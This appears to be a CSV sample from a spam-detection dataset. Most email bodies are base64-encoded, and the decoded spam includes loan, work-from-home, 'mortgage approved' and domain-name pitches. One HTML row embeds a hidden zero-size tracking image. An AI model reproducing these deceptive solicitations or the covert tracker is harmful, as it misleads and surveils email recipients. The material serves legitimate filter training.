spam_label,text,text_cleaned
1,bG92ZQ0KV29ybGQgQ2FwaXRhbCBHcm91cCBpcyBhIGdyb3VwIG9mIEZ1bmRp bmcgU291cmNlcyB0aGF0IGhlbHAgYnVzaW5lc3NlcyANCndpdGggdGhlaXIg ZmluYW5jaWFsIG5lZWRzLiAgV2UgY2FuIHByb3ZpZGUgV29ya2luZyBDYXBp dGFsIHRvICQxNTAsMDAwIA0Kb24gYW4gdW5zZWN1cmVkIGJhc2lzOyB3aGlj aCBjYW4gYmUgdXNlZCB0byB0YWtlIGNhcmUgb2YgY2FzaCBmbG93IA0KbmVl ZHMsIHByb3ZpZGUgZnVuZHMgZm9yIGV4cGFuc2lvbiBhbmQgb3RoZXIgbmVl ZHMgeW91ciBidXNpbmVzcyBoYXMgKFVTIA0KYnVzaW5lc3NlcyBvbmx5KS4g IFdlIGFsc28gcHVyY2hhc2UgSW52b2ljZXMsIEFjY291bnRzIFJlY2VpdmFi bGVzLCANCkxlYXNlcywgQXV0byBQb3J0Zm9saW9zLCBCdXNpbmVzcyBhbmQg UmVhbCBFc3RhdGUgTm90ZXMsIGFuZCBvdGhlciBDYXNoIA0KRmxvd3MuICBJ ZiB5b3Ugd291bGQgbGlrZSB0byBpbnF1aXJlIGFib3V0IHVzIGhlbHBpbmcg eW91IHRvZGF5IHdpdGggeW91ciANCmNhcGl0YWwgbmVlZHMsIHBsZWFzZSBj bGljayBvbiB0aGUgbGluayBiZWxvdyBmb3IgZGV0YWlscyBhbmQgc3VibWlz c2lvbiANCmZvcm0uICBUaHggZm9yIHlvdXIgdGltZS4gIFdvcmxkIENhcGl0 YWwgR3JvdXANCg0KaHR0cDovL3d3dy5tYWlscGFpbC5jb20NCg0KaHR0cDov L3d3dy5tYWlscGFpbC5jb20NCg0KDQoNCg0KDQoNCg0KDQoNCmxvdmUNCg0K DQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoN Cg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0K DQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KbG92ZQ0KDQpZb3UgYXJlIHJlY2ll dmluZyB0aGlzIGVtYWlsIGFzIGEgc3Vic2NyaWJlciBvciBhZmZpbGlhdGUg c3VjYnNjcmliZXIgDQp0byBvcHRpbiBuZXR3b3JrLiAgSWYgeW91IGhhdmUg cmVjZWl2ZWQgdGhpcyBhcyBhbiBlcnJvciBvciB3b3VsZCBsaWtlIA0KdG8g YmUgdGFrZW4gb2ZmIG91ciBsaXN0IHBsZWFzZSBzZW5kIGFuIGVtYWlsIHRv IG5vcm1vcmVAZXlvdS5jb20uICBUaGFuayANCnlvdSBhbmQgaGF2ZSBhIGdy ZWF0IGRheS5sb3ZlDQowOTgxWFZLVjktMTE1eWFMbDkzMDlRUGFsMjM=,
1,SGVscCB3YW50ZWQuICBXZSBhcmUgYSAxNCB5ZWFyIG9sZCBmb3J0dW5lIDUw MCBjb21wYW55LCB0aGF0IGlzDQpncm93aW5nIGF0IGEgdHJlbWVuZG91cyBy YXRlLiAgV2UgYXJlIGxvb2tpbmcgZm9yIGluZGl2aWR1YWxzIHdobw0Kd2Fu dCB0byB3b3JrIGZyb20gaG9tZS4NCg0KVGhpcyBpcyBhbiBvcHBvcnR1bml0 eSB0byBtYWtlIGFuIGV4Y2VsbGVudCBpbmNvbWUuICBObyBleHBlcmllbmNl DQppcyByZXF1aXJlZC4gIFdlIHdpbGwgdHJhaW4geW91Lg0KDQpTbyBpZiB5 b3UgYXJlIGxvb2tpbmcgdG8gYmUgZW1wbG95ZWQgZnJvbSBob21lIHdpdGgg YSBjYXJlZXIgdGhhdCBoYXMNCnZhc3Qgb3Bwb3J0dW5pdGllcywgdGhlbiBn bzoNCg0KaHR0cDovL3d3dy5iYXNldGVsLmNvbToyNzAwMC93ZWFsdGhub3cN Cg0KV2UgYXJlIGxvb2tpbmcgZm9yIGVuZXJnZXRpYyBhbmQgc2VsZiBtb3Rp dmF0ZWQgcGVvcGxlLiAgSWYgdGhhdCBpcyB5b3UNCnRoYW4gY2xpY2sgb24g dGhlIGxpbmsgYW5kIGZpbGwgb3V0IHRoZSBmb3JtLCBhbmQgb25lIG9mIG91 cg0KZW1wbG95ZW1lbnQgc3BlY2lhbGlzdCB3aWxsIGNvbnRhY3QgeW91Lg0K DQpUbyBiZSByZW1vdmVkIGZyb20gb3VyIGxpbmsgc2ltcGxlIGdvIHRvOg0K DQpodHRwOi8vd3d3LmJhc2V0ZWwuY29tL3JlbW92ZS5odG1sDQoNCg==,
0,DQoNCg0KU1VCU0NSSVBUSU9OIElORk9STUFUSU9ODQoqKioqDQpZb3UgaGF2ZSByZWNlaXZlZCB0 aGlzIGUtbWFpbCBiZWNhdXNlIHlvdSBhcmUgYW4gRURDIHJlZ2lzdHJhbnQgb3IgeW91IHByZXZp b3VzbHkgcmVxdWVzdGVkIGluZm9ybWF0aW9uIGZyb20gRXNwaWFsLiAgSWYgeW91IHdpc2ggdG8g YmUgcmVtb3ZlZCBmcm9tIHRoaXMgbGlzdCwgcGxlYXNlIHJlcGx5IHRvIGZhY2VsaXN0QGVzcGlh bC5jb20gYW5kIGluY2x1ZGUgdGhlIHdvcmRzICd1bnN1YnNjcmliZSBURVhUJyAod2l0aG91dCBx dW90ZXMpIGluIHRoZSBTVUJKRUNUIExJTkUuDQoNClRvIGdldCB0aGUgdmVyc2lvbiB3aXRoIHBp Y3R1cmVzLCBzZW5kIGFuIGVtYWlsIHRvIGZhY2VsaXN0QGVzcGlhbC5jb20gd2l0aCB0aGUgc3Vi amVjdCBsaW5lICJTVUJTQ1JJQkUgSFRNTCINCg0KKGMpIDIwMDIsIEVzcGlhbCBHcm91cCBJbmMu LCBFc3BpYWwgRXNwcmVzc28sIEVzcGlhbCBFc2NhcGUsIEVzcGlhbCBFYm94LCBFc3BpYWwgQXNz aXN0YW50LCBFc3BpYWwgRGV2aWNlVG9wIGFuZCBFc3BpYWwgRGV2aWNlU2VydmVyIGFyZSB0cmFk ZW1hcmtzIG9mIEVzcGlhbCBHcm91cC4gQWxsIG90aGVyIHRyYWRlbWFya3MgYmVsb25nIHRvIHRo ZWlyIHJlc3BlY3RpdmUgb3duZXJzLiBBbGwgcmlnaHRzIHJlc2VydmVkDQoqKioqDQoNCg0K,
1,<html><body><IMG SRC='http://master2.free4all.com/cgi-bin/sp/t.pl?id=6:56446664&o=1&d=1' BORDER=0 WIDTH=0 HEIGHT=0/><center><img src=http://www.vitafactory.com/ad-friday/test.gif border=0></body></html>,
1,WW91ciBtb3J0Z2FnZSBoYXMgYmVlbiBhcHByb3ZlZC4NCg0KTm93IGFwcGx5 IGZvciBob3cgbXVjaCB5b3UgZ2V0IQ0KDQpodHRwOi8vNjYuMjMxLjEzMy4y MDEvRnJlZS8NCg0KDQoNCg0KVG8gYmUgcmVtb3ZlZCBmcm9tIG91ciBtYWls aW5nIGNsaWNrIGhlcmUNCg0KaHR0cDovLzY2LjIzMS4xMzMuMjAxL1JlbW92 ZS8NCjI4NzB4dGlhMi02NjlqZUNqNjk1NHJ2d0M2LTI2OVZ2cWg3MDkyTkts Mzg=,
1,http://www.rebackee.com/cursos2/contraloria.htm,
1,eyVSQU5EfQ0KUFVCTElDIEFOTk9VTkNFTUVOVDoNCg0KVGhlIG5ldyBkb21h aW4gbmFtZXMgYXJlIGZpbmFsbHkgYXZhaWxhYmxlIHRvIHRoZSBnZW5lcmFs IHB1YmxpYyBhdCBkaXNjb3VudCBwcmljZXMuIE5vdyB5b3UgY2FuIHJlZ2lz dGVyIG9uZSBvZiB0aGUgZXhjaXRpbmcgbmV3IC5CSVogb3IgLklORk8gZG9t YWluIG5hbWVzLCBhcyB3ZWxsIGFzIHRoZSBvcmlnaW5hbCAuQ09NIGFuZCAu TkVUIG5hbWVzIGZvciBqdXN0ICQxNC45NS4gVGhlc2UgYnJhbmQgbmV3IGRv bWFpbiBleHRlbnNpb25zIHdlcmUgcmVjZW50bHkgYXBwcm92ZWQgYnkgSUNB Tk4gYW5kIGhhdmUgdGhlIHNhbWUgcmlnaHRzIGFzIHRoZSBvcmlnaW5hbCAu Q09NIGFuZCAuTkVUIGRvbWFpbiBuYW1lcy4gVGhlIGJpZ2dlc3QgYmVuZWZp dCBpcyBvZi1jb3Vyc2UgdGhhdCB0aGUgLkJJWiBhbmQgLklORk8gZG9tYWlu IG5hbWVzIGFyZSBjdXJyZW50bHkgbW9yZSBhdmFpbGFibGUuIGkuZS4gaXQg d2lsbCBiZSBtdWNoIGVhc2llciB0byByZWdpc3RlciBhbiBhdHRyYWN0aXZl IGFuZCBlYXN5LXRvLXJlbWVtYmVyIGRvbWFpbiBuYW1lIGZvciB0aGUgc2Ft ZSBwcmljZS4gIFZpc2l0OiBodHRwOi8vd3d3LmFmZm9yZGFibGUtZG9tYWlu cy5jb20gdG9kYXkgZm9yIG1vcmUgaW5mby4NCiANClJlZ2lzdGVyIHlvdXIg ZG9tYWluIG5hbWUgdG9kYXkgZm9yIGp1c3QgJDE0Ljk1IGF0OiBodHRwOi8v d3d3LmFmZm9yZGFibGUtZG9tYWlucy5jb20uIFJlZ2lzdHJhdGlvbiBmZWVz IGluY2x1ZGUgZnVsbCBhY2Nlc3MgdG8gYW4gZWFzeS10by11c2UgY29udHJv bCBwYW5lbCB0byBtYW5hZ2UgeW91ciBkb21haW4gbmFtZSBpbiB0aGUgZnV0 dXJlLg0KIA0KU2luY2VyZWx5LA0KIA0KRG9tYWluIEFkbWluaXN0cmF0b3IN CkFmZm9yZGFibGUgRG9tYWlucw0KDQoNClRvIHJlbW92ZSB5b3VyIGVtYWls IGFkZHJlc3MgZnJvbSBmdXJ0aGVyIHByb21vdGlvbmFsIG1haWxpbmdzIGZy b20gdGhpcyBjb21wYW55LCBjbGljayBoZXJlOg0KaHR0cDovL3d3dy5jZW50 cmFscmVtb3ZhbHNlcnZpY2UuY29tL2NnaS1iaW4vZG9tYWluLXJlbW92ZS5j Z2kNCjMwDQoNCg0KWzk0MzBwSGJUNC04OThsR3lRODA1OWlDdU0zLTQwMGdZ cUs3NjYxY1VtRzMtOTE5elJMRDcxNjB2cGh6Mi01MjFUTERANjNdDQo=,
1,Tm90ZTpJZiB0aGlzIGVhbWlsIGlzIG5vdCBmaXQgZm9yIHlvdSxwbGVhc2UgcmVwbHkgdG8g d2VibWFzdGVyQHdqanp6cy5jb20gd2l0aA0KInJlbW92ZSIuDQpXZSBkb24ndCBpbnRlbmQg dG8gc2VuZCBzcGFtIGVtYWlsIHRvIHlvdS5UaGFuayB5b3UhDQoNCkRlYXIgc2lycyBvciBN YWRhbXMsDQpXZSBhcmUgb25lIEFyY3lsIGJhdGh0dWIgbWFudWZhY3R1cmVyIGluIENoaW5h Lg0KDQotLS0tLS0tLS0tLS0tLS0tLVByb2ZpbGUtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0K DQpPdXIgZmFjdG9yeXNwZWNpYWxpemVzIGluIG1hbnVmYWN0dXJpbmcgobBZRU1BobEgYnJh bmQgYWNyeWxpYyBjb21wb3NpdGUgYmF0aHR1YnMsDQp3ZSBoYXZlIG1vcmUgdGhhbiAxMCB5 ZWFycyBleHBlcmllbmNlIG9mIGJhdGh0dWIgbWFudWZhY3R1cmluZyBhbmQgbWFya2V0aW5n Lg0KV2l0aCBvdXIgY29uc2lkZXJhYmxlIGV4cGVyaWVuY2Ugd2Ugc2V0IG91dCB0byBibGVu ZCB0aGUgYWR2YW50YWdlcyBvZiBhbGwgdGhlIG90aGVyDQpvZiBiYXRodHVicyBvZmZlcmVk IGluIHRoZSBtYXJrZXQgcGxhY2UgaW50byBvbmUgcmFuZ2UuIEFmdGVyIHNldmVyYWwgeWVh cnMgZGV2ZWxvcG1lbnQNCndlIHByb2R1Y2VkIG91ciBjdXJyZW50IHJhbmdlIGFuZCB0aGUg WUVNQSBicmFuZCBiYXRodHViIHdhcyBwYXRlbnRlZCBpbiAyMDAxLiBXZSB3ZXJlDQpldmVu IGF3YXJkZWQgdGhlICJHb2xkIE1lZGFsIiBpbiB0aGUgIkNoaW5lc2UgUGF0ZW50IFRlY2hu b2xvZ3kgRXhoaWJpdGlvbiIgYW5kDQoiVGhlIE5pbnRoIENoaW5lc2UgTmV3IFBhdGVudCBU ZWNobm9sb2d5IGFuZCBOZXcgUGF0ZW50IFByb2R1Y3QgRXhoaWJpdGlvbiIgbGF0ZXIgdGhh dCB5ZWFyLg0KVGhlIFlFTUEgYmF0aHR1YnMgc3RydWN0dXJhbCBkZXNpZ24gaXMgdGhhdCBv ZiBhIG5vcm1hbCBhY3J5bGljIGJhdGh0dWIgYnV0IGNvbmdsdXRpbmF0ZWQNCmludG8gYSBj b21wb3NpdGUgbWF0ZXJpYWwuIEl0IGlzIHJpZGdlZCBhbmQgaXMgbWFkZSBtb3JlIHRoYW4g dHdpY2UgYXMgdGhpY2sgYXMgYSBub3JtYWwNCnVuaXQsIG1ha2luZyBpdCBtb3JlIHNtb290 aCwgZ2VudGxlIGFuZCBlbGVnYW50LiBUaGlzIG1hbnVmYWN0dXJpbmcgdGVjaG5pcXVlIG5v dCBvbmx5DQpwcm92aWRlcyBhbGwgdGhlIGFkdmFudGFnZXMgb2YgYSBub3JtYWwgYWNyeWxp YyBiYXRodHViIChlYXNpbHkgdG8gY2xlYW4sIHJlc2lzdGFuY2UgdG8NCmRpcnQsIGNvbG9y ZnVsLGF0dHJhY3RpdmUgZXRjKSBidXQgYWxzbyBwcm92aWRlcyBpbmNyZWFzZWQgaGVhdCBy ZXRlbnRpb24sIGFuZCBleHRlbmRzDQp0aGUgcHJvZHVjdHMgbGlmZSBzcGFuLg0KDQpCZXNp ZGVzIG91ciBwcm9kdWN0cyBvbiB3ZWJzaXRlLCB3ZSBub3cgcHJvZHVjZSBzb21lIG5ldyBt b2RlbHMgZm9yIFVTQSBtYXJrZXQuDQpXZSBhbHNvIHByb2R1Y2Ugc2hvd2VyIHBhbmVscyB3 aXRoIGZpbmVzdCBxdWFsaXR5Lg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tYmF0aHR1YiBTcGVj aWZpY2F0aW9ucy0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KMSxXYWxsIHRoaWNrbmVzczoxMG1t fjIwbW0NCjIsV2VpZ2h0OiA1MH42MEtHDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS1Db29wZXJh dGUtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpXZSB3b3VsZCBsaWtlIHRv IGJlIHlvdXIgT0VNL09ETSBtYW51ZmFjdHVyZXIuDQoNCkZvciBkZXRhaWxlZCBpbmZvLCBw bGVhc2UgYnJvd3NlIG91ciB3ZWJzaXRlIGh0dHA6Ly93d3cud2pqenpzLmNvbQ0KDQpCZXN0 IHdpc2hlcyBhbmQgcmVnYXJkcywNCg0KRXhwb3J0IE1hbmFnZXINCkplcnJ5IExlZQ0KTW9i aWxlOjEzOTUxMjI4NTYxDQpQaG9uZTowMDg2LTUxOS01MjExOTczDQpGYXg6ICAwMDg2LTUx OS01MjA5Nzc2DQpXdWppbiBIdWFuZ2xpIENvbXBvc2l0ZWQgU2FuaXRhcnkgRmFjdG9yeQ0K QWRkOkhVYW5nbGkgdG93bixXdWppbiBjb3VudHkNCiAgICBDaGFuZ3pob3UgMjEzMTUxDQog ICAgSmlhbmdzdSBwcm92aW5jZQ0KICAgIFAuUi5DaGluYQ0KV2Vic2llOmh0dHA6Ly93d3cu d2pqenpzLmNvbQ0KRW1haWw6d2pqenpzQHdqanp6cy5jb20NCg0KICAgIA==,
1,PGh0bWw+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29u dGVudD0iemgtdHciPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0 ZXh0L2h0bWw7IGNoYXJzZXQ9YmlnNSI+DQo8bWV0YSBuYW1lPSJHRU5FUkFUT1IiIGNvbnRlbnQ9 Ik1pY3Jvc29mdCBGcm9udFBhZ2UgNC4wIj4NCjxtZXRhIG5hbWU9IlByb2dJZCIgY29udGVudD0i RnJvbnRQYWdlLkVkaXRvci5Eb2N1bWVudCI+DQo8dGl0bGU+pL2qqbxzp2mrSL1kqNI8L3RpdGxl Pg0KPC9oZWFkPg0KDQo8Ym9keT4NCg0KPHAgc3R5bGU9Im1hcmdpbi10b3A6IDA7IG1hcmdpbi1i b3R0b206IDAiPjxmb250IGNvbG9yPSIjODA4MDgwIj6zb6xPqWWwVaXRsU23frxzp2mkvaVxpU61 b6TFqr2xtaZeq0i1TKprsbWmrCAgICAgDQrL5yB+ICE8L2ZvbnQ+PC9wPiAgICANCg0KPGhyIHNp emU9IjEiPg0KPGRpdiBhbGlnbj0iY2VudGVyIj4NCiAgPGNlbnRlcj4NCiAgPHRhYmxlIGJvcmRl cj0iMCIgd2lkdGg9IjYwNiIgaGVpZ2h0PSIzNjUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGlu Zz0iMCIgc3R5bGU9ImJvcmRlcjogMiBkb3R0ZWQgI0ZGOTkzMyI+DQogICAgPHRyPg0KICAgICAg PHRkIHdpZHRoPSI2MDAiIGhlaWdodD0iMzY1IiB2YWxpZ249Im1pZGRsZSIgYWxpZ249ImNlbnRl ciIgYmdjb2xvcj0iI0U2RkZGMiI+PGZvbnQgc2l6ZT0iNCI+PGI+PGZvbnQgY29sb3I9IiMwMDgw ODAiPrRNp+TCvaitvve3fLbcoUg8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDAwMDAiPqazuGfA2cCj pE+23KFIoUg8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwMDAiPrdRvtams6bbpHaquqjGt3623KFI oUihSDwvZm9udD48L2I+PC9mb250Pg0KICAgICAgICA8cD4mbmJzcDs8Yj48Zm9udCBjb2xvcj0i I2ZmMDBmZiIgc2l6ZT0iNyI+p088L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMDAiIHNpemU9IjYi PsNousOhSaFJp0u2T711pFe8dqT5pd+nWbHQp0GmcKbzsLWo7KzdwLSkRrROr+A8L2ZvbnQ+PGZv bnQgY29sb3I9IiNmZjY2MDAiIHNpemU9IjciPqfvxdynQaq6pEClzTwvZm9udD48L2I+PC9wPg0K ICAgICAgICA8cD48Zm9udCBzaXplPSI1Ij4mbmJzcDs8L2ZvbnQ+PGEgaHJlZj0iaHR0cDovL2Rp bW9uLmg4aC5jb20udHcvIj48Yj48dT48c3BhbiBzdHlsZT0iQkFDS0dST1VORC1DT0xPUjogIzAw MDBmZiI+PGZvbnQgY29sb3I9IiNmZmZmMDAiIHNpemU9IjUiPr11pFe8dqT5PC9mb250Pjwvc3Bh bj48L3U+PC9iPjwvYT48L3A+DQogICAgICAgIDxwPqFAPC90ZD4NCiAgICA8L3RyPg0KICA8L3Rh YmxlPg0KICA8L2NlbnRlcj4NCjwvZGl2Pg0KPGhyIHNpemU9IjEiPg0KPHAgYWxpZ249ImNlbnRl ciIgc3R5bGU9Im1hcmdpbi10b3A6IDA7IG1hcmdpbi1ib3R0b206IDAiPjxmb250IGNvbG9yPSIj RkYwMDAwIj6mcKazpbTCWr3QqKO9zKFBpKO3UaZBpqyo7Ka5q0i90Kv2Jm5ic3A7ICAgDQotJmd0 OyZuYnNwOyAoPGEgaHJlZj0iaHR0cDovL3gtbWFpbC5oOGguY29tLnR3IiB0YXJnZXQ9Il9ibGFu ayI+qdqmrLxzp2k8L2E+KTwvZm9udD48L3A+IA0KDQo8L2JvZHk+DQoNCjwvaHRtbD4=,
